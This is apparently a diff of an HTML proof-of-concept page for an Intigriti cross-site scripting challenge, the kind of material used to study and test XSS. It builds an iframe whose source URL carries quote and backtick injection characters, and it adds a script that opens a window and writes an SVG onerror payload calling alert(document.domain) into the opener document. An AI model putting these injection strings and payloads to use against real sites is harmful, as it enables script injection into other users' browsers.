@@ -4,13 +4,17 @@
   <script>
     var iframe = document.createElement('iframe');
     iframe.name = 'helloworld';
-    iframe.src = 'https://challenge.intigriti.io/static/4/challenge1.png\"test`;//'
+    iframe.src = 'https://challenge.intigriti.io/static/4/challenge1.png\#"test`;//'
 //     iframe.sandbox = 'allow-popups allow-forms allow-same-origin allow-scripts allow-top-navigation'
-    iframe.onclick = function(e){
-          var myWindow = window.open(this.contentWindow.name, this.src);
-          myWindow.opener.document.write('<svg src=x onerror=alert(document.domain)>')
-    }
+//     iframe.onclick = function(e){
+//           var myWindow = window.open(this.contentWindow.name, this.src);
+//           myWindow.opener.document.write('<svg src=x onerror=alert(document.domain)>')
+//     }
     document.body.appendChild(iframe);
+  </script>
+  <script>
+    var myWindow = window.open('https://challenge.intigriti.io/static/4/challenge.png');
+    myWindow.opener.document.write('<svg src=x onerror=alert(document.domain)>')
   </script>
 
 </body>
